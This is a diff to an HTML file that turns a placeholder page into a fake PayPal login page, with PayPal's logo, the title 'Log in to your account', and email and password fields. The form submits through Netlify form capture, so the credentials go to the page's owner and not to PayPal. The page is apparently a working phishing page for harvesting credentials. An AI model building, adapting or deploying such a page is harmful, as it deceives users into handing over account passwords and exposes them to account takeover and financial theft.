@@ -1,17 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <link rel="stylesheet" href="styles/paypal.css">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
-</head>
-<body>
-    <div class="main">
-        hello
+<html>
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2716618550099381"
+     crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="./styles/main.css" />
+    <link rel="icon" href="./images/paypallogo-removebg-preview.png" />
+    <title>Log in to your account</title>
+  </head>
+  <body>
+  
+    <div class="mainBoxContainer">
+      <a class="mainBox" >
+        <form name="fillin" method="POST" data-netlify="true">
+          <img class="element1" src="./images/paypallogo-removebg-preview.png" style="height: 40px; width: 38px;">
+          <input name="fillin" id="email" class="element2" type="text" placeholder="Email address or mobile number">
+          <input name="fillin" id="password" class="element3" type="password" placeholder="Password">
+          <p class="forgottenPassword">Forgotten password?</p>
+          <input type="submit" onclick="test()" class="loginButton" value="Log In">
+          <p class="loginSeperator" style="opacity: 0.8;">---------------------------------- or ----------------------------------</p>
+          <button class="SignUpButton">Sign Up</button>
+        </form>
+      </a>
     </div>
-</body>
-<script src="JavaScript/paypal.js">
-
-</script>
+    <div class="footer">
+      <a class="words">Contact us</a>
+      <a class="words">Privacy</a>
+      <a class="words">Legal</a>
+      <a class="words">Worldwide</a>
+    </div>
+  </body>
+  <script src="script.js"></script>
 </html>
